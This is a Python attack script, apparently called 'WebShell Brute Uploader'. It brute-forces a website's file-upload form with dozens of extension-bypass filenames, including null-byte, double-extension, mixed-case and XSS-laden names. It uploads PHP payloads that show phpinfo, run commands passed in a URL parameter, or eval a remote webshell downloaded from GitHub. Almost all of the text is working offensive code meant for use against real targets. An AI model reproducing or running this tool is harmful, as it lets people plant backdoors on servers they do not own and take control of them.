#!/usr/bin/python

import requests, sys, os, re
from urllib import parse

#Configuration
mode = 1 #write_phpinfo(mode)
debug_mode = 0 #1 = true, 0 = false
file_name = "filthyroot" #result filename

def banner():
	print('''
 .................. 
 . WebShell Brute . @author : RobotPaceUsa
 .     Uploader   . @github : Ahmadchen
 .................. 
 ''')

def convertparams(urlstyle):
	parsed = dict(parse.parse_qsl(urlstyle))
	return(parsed)

def write_phpinfo(mode,ext):
	if mode == 1:
		code = "<?php phpinfo();?>"
	if mode == 2:
		code = "<?php system($_GET['c']);?>"
	if mode == 3:
		code = '<?php eval("?>".file_get_contents("https://raw.githubusercontent.com/linuxsec/indoxploit-shell/master/shell-v3.php"));?>'

	f = open("/tmp/info." + ext,"w")
	f.write(code)
	f.close()

def post_file(target, params, cookie, fileparams, filename,filepath):
	data    = convertparams(params)
	cookies = convertparams(cookie)
	filex   = {fileparams:(filename, open(filepath,'rb'))}
	#ori_size = len(requests.get(target, cookies=cookies).content)
	r = requests.post(target, files=filex, data = data, cookies=cookies)
	#size = len(r.content)
	content = r.text.lower()
	if debug_mode == 1:
		if re.search("success",content) or re.search("sukses",content) or re.search("berhasil",content) or re.search("done",content) or re.search("true",content) or re.search("uploaded",content) or r.status_code == "302":
			return("[True] " + filename + "\n" + content + "\n\n")
		elif re.search("failed",content) or re.search("fail",content) or re.search("gagal",content) or re.search("false",content) or re.search("denied",content):
			return("[Check] " + filename + "\n" + content + "\n\n")
		else:
			return("[Check] " + filename + "\n" + content + "\n\n")
	else:
		if re.search("success",content) or re.search("sukses",content) or re.search("berhasil",content) or re.search("done",content) or re.search("true",content) or re.search("uploaded",content) or r.status_code == "302":
			return("[True] " + filename)
		elif re.search("failed",content) or re.search("fail",content) or re.search("gagal",content) or re.search("false",content) or re.search("denied",content):
			return("[Check] " + filename)
		else:
			return("[Check] " + filename)


if len(sys.argv) < 4:
	banner()
	print(''' Usage : 
	ws.py [target/upload.php] [required form] [file input params] [cookie session]''')
	#Example ws.py http://target.com/do_upload.php "name[]=adam&age[]=18" "file[]" "PHPSESSID=57p862iqcq49hoh91m9m60ka1u"

else:
	banner()
	target  = sys.argv[1]
	params  = sys.argv[2]
	filepar = sys.argv[3]
	cookie  = sys.argv[4]

	#file_ext = ['php','txt','<img src=x onerror=alert(1)>']
	file_ext = ['php','php.pjpeg','php.black','phtml','php.fla','php.ndsfx','php5','php7','PhP','pHp','php.xxxjpg','php%00.jpg',
	'php<?\'.txt','txt','phtml.fla','PhTmL','pphtml','<img src=x onerror=alert(1)>','<img src=x onerror="javascript:document.documentElement.innerHTML=\'hacked by filthyroot\';">']
	for ext in file_ext:
		write_phpinfo(mode,ext)
		print(post_file(target, params, cookie, filepar, file_name + "." + ext,"/tmp/info." + ext))
		#exit()
